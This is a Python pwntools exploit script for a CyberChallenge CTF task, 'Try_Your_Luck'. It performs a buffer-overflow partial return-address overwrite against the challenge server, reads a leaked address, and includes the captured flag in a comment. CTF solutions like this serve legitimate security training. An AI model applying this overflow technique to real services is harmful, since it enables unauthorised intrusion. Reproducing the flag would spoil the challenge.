from pwn import *

exe = ELF("/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 10/Try_Your_Luck/try_your_luck")
context.binary = exe
HOST = "yourluck.challs.cyberchallenge.it"
PORT = 6013
p = remote(HOST, PORT)

print("[+] Exploiting...")
shell = b"\x3a\x38"  # part of the address that does not change (lower part)
padding = b"A" * 40  # padding to trigger the error

payload = padding
payload += shell  # add lower part of address to padding

p.send(payload)
p.recvuntil(b"lucky ")
line = p.recvline()
addr = line[40:44]  # copy the rest of the address printed by the printf
addr = hex(int.from_bytes(addr, byteorder="little"))  # convert addr to hex
log.info("you_won --> %s" % addr)
p.interactive()

# CAUTION!! Some time the exploit doesn't work because the high part of address is randomly generated
# FLAG --> CCIT{best luck of 4ll i5 the luCk U Mak3 4 Urself}
